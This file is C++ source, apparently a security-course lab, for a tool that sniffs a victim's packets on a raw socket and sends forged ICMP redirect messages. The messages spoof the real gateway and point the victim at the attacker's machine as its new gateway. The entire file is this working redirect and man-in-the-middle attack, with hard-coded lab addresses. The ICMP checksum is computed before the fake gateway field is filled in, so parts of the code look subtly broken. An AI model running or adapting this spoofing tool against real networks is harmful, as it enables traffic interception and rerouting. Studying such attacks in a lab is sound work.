#include <cstdio>

#include <cstdlib>

#include <cstring>

#include <arpa/inet.h>

#include <sys/socket.h>

#include <netinet/ip_icmp.h>

#include <netinet/ether.h>

// 通用的套接字地址
// struct sockaddr {
//    unsigned short   sa_family;  AF_INET -> IPV4
//    char             sa_data[14];
// };
//
// struct sockaddr_in {
//    short int            sin_family;  AF_INET -> IPV4
//    unsigned short int   sin_port;    port
//    struct in_addr       sin_addr;    IP地址
//    unsigned char        sin_zero[8];
// };
// sa_data -> sin_port+sin_addr+sin_zero[8]
// struct in_addr {
//    unsigned long s_addr;
// };

#define BUFFSIZE 1024

struct sockaddr_in target;

struct sockaddr_in source;

/* ip集合 */

const char *originalGateway = "192.168.96.2"; // 原网关

const char *attacked = "192.168.96.131"; // 攻击对象IP

const char *fakeGatway = "192.168.96.128"; // 攻击者IP

// 计算校验和

unsigned short in_cksum(unsigned short *addr, int len)
{

  int sum = 0;

  unsigned short res = 0;

  while (len > 1)
  {

    sum += *addr++;

    len -= 2;
  }

  if (len == 1)
  {

    *((unsigned char *)(&res)) = *((unsigned char *)addr);

    sum += res;
  }

  sum = (sum >> 16) + (sum & 0xffff);

  sum += (sum >> 16);

  res = ~sum;

  return res;
}

int main()
{

  /* receive var */

  int rawsock;

  char rec_mac_buff[BUFFSIZE];

  int rec_num;

  int count = 0;

  /* send var */

  char send_buff[56] = {0};

  int sockfd;

  const int on = 1;

  /* =================== 嗅探部分 ========================= */
  /*
    int socket(int domain, int type, int protocol)
    domain:协议域   协议族决定了socket的地址类型,在通信中必须采用相应的地址.
    PF_PACKET：发送接收以太网数据帧 是面向链路层的套接字
    type: 指定socket的类型.
    原始套接字(SOCK_RAW) 还可以为SOCK_STREAM SOCK_DGRAM
    Protocol是上层的协议号，
    #define ETH_P_IP 0x0800 /* Internet Protocol packet */

  // 用于从数据链路层接收分组
  rawsock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_IP)); // htons() Host to Network Short

  if (rawsock < 0)
  {

    printf("raw socket error!\n");

    exit(1);
  }

  /* =================== 构造icmp并发送 ========================= */

  // 创建send socket
  /*
    如果第三个参数是IPPROTO_TCP、IPPROTO_UDP、IPPROTO_ICMP，
    则我们所构造的报文从IP首部之后的第一个字节开始，IP首部由内核自己维护，
    首部中的协议字段会被设置为我们调用socket()函数时传递给它的protocol字段
   */
  if ((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) < 0)
  {

    printf("create sockfd error\n");

    exit(-1);
  }
  /*
    如果设置了IP_HDRINCL选项，
    那么用户需要自己生成IP头部的数据，
    其中IP首部中的标识字段和校验和字段总是内核自己维护。
   */

  // 开启IP_HDRINCL选项，手动填充IP头

  if (setsockopt(sockfd, SOL_IP, IP_HDRINCL, &on, sizeof(int)) < 0)
  {

    printf("set socket option error!\n");

    exit(1);
  }

  while (true)
  {

    // receive number, receive data in ethernet layer

    rec_num = recvfrom(rawsock, rec_mac_buff, BUFFSIZE, 0, NULL, NULL);

    if (rec_num < 0)
    {

      printf("receive error!\n");

      exit(1);
    }

    // 以太网帧首部14B

    char *rec_ip_buff = rec_mac_buff + 14;

    /*

     * 重定向报文:IP(20) + ICMP报文(8+28==>(icmp头8+原ip数据报28)) = 56

     * 原ip28:将收到的需要进行差错报告IP数据报的首部和数据字段的前8个字节提取出来，作为ICMP报文的数据字段

     * 重定向IP头: task-1

     * ICMP报文头: task-2

     * 原IP: task-3

    */

    // rec_buff强制转换为ip类型结构体,把ip类型的结构体指针指向rec_buff

    //     struct ip{
    // #if BYTE_ORDER == LITTLE_ENDIAN
    //       u_char ip_hl : 4, /* header length */
    //           ip_v : 4;     /* version */
    // #endif
    // #if BYTE_ORDER == BIG_ENDIAN
    //       u_char ip_v : 4, /* version */
    //           ip_hl : 4;   /* header length */
    // #endif
    //       u_char ip_tos;                 /* type of service */
    //       short ip_len;                  /* total length */
    //       u_short ip_id;                 /* identification */
    //       short ip_off;                  /* fragment offset field */
    // #define IP_DF 0x4000                 /* dont fragment flag */
    // #define IP_MF 0x2000                 /* more fragments flag */
    //       u_char ip_ttl;                 /* time to live */
    //       u_char ip_p;                   /* protocol */
    //       u_short ip_sum;                /* checksum */
    //       struct in_addr ip_src, ip_dst; /* source and dest address */
    //     };

    auto *ip = (struct ip *)rec_ip_buff;

    // 构造icmp重定向报文的源ip地址
    // sin_addr IP地址
    // inet_aton 功能是将一个字符串IP地址转换为一个32位的网络序列IP地址
    if (inet_aton(originalGateway, &source.sin_addr) == 0)
    {

      printf("create source_addr error");

      exit(1);
    }

    // 构造icmp重定向报文的目的地址

    if (inet_aton(attacked, &target.sin_addr) == 0)
    {

      printf("create destination_addr error");

      exit(1);
    }

    // 只向目的地址是网关的目标主机发起ICMP重定向攻击

    if (source.sin_addr.s_addr != ip->ip_dst.s_addr ||

        target.sin_addr.s_addr != ip->ip_src.s_addr)
    {
      // inet_ntoa 返回点分十进制的字符串在静态内存中的指针。
      char *p = inet_ntoa(ip->ip_src);

      printf("%s is not attacked_addr\n", p);

      continue;
    }

    // 先把收到的ip报文的前28个字节赋值给sendbuf的后28-56个字节
    // char *rec_ip_buff = rec_mac_buff + 14;

    memcpy(send_buff + 28, rec_ip_buff, 28);

    // 修改rec_buff的ip报文段的值

    ip->ip_src = source.sin_addr;

    ip->ip_dst = target.sin_addr;

    ip->ip_len = 56;

    ip->ip_id = IP_DF;

    ip->ip_off = 0;

    ip->ip_ttl = 64;

    ip->ip_p = 1;

    // 把前20个字节写入sendbuf
    // auto *ip = (struct ip *)rec_ip_buff;

    memcpy(send_buff, rec_ip_buff, 20);

    // 把send_buff的20-28字段的icmp报文首部填好(直接使用sendbuf填值)
    // struct icmp
    // {
    //   u_int8_t icmp_type;   /* type of message, see below */
    //   u_int8_t icmp_code;   /* type sub code */
    //   u_int16_t icmp_cksum; /* ones complement checksum of struct */
    //   union
    //   {
    //     u_char ih_pptr;           /* ICMP_PARAMPROB */
    //     struct in_addr ih_gwaddr; /* gateway address */
    //     struct ih_idseq           /* echo datagram */
    //     {
    //       u_int16_t icd_id;
    //       u_int16_t icd_seq;
    //     } ih_idseq;
    //     u_int32_t ih_void;
    //     ....
    //   } icmp_hun

    struct icmp *icmp = (struct icmp *)(send_buff + 20);

    icmp->icmp_type = ICMP_REDIRECT;

    icmp->icmp_code = ICMP_REDIR_HOST;

    icmp->icmp_cksum = 0;
    
    // 36 = 8+28

    icmp->icmp_cksum = in_cksum((unsigned short *)icmp, 36);

    // 构造icmp重定向报文的fake gatway

    if (inet_aton(fakeGatway, &icmp->icmp_hun.ih_gwaddr) == 0)
    {

      printf("create destination_addr error");

      exit(1);
    }

    count += 1;

    // 打印的时候用

    printf("重定向报文的源地址: %s\n", originalGateway);

    printf("重定向报文的目的地址: %s\n", attacked);

    printf("重定向报文的假网关: %s\n", fakeGatway);

    // send
    // int sendto(int s, const void * msg, int len, unsigned int flags, const struct sockaddr * to, int tolen);
    sendto(sockfd, &send_buff, 56, 0, (struct sockaddr *)&target, sizeof(target));

    printf("====================== already sended %d message ===========================\n", count);
  }
}
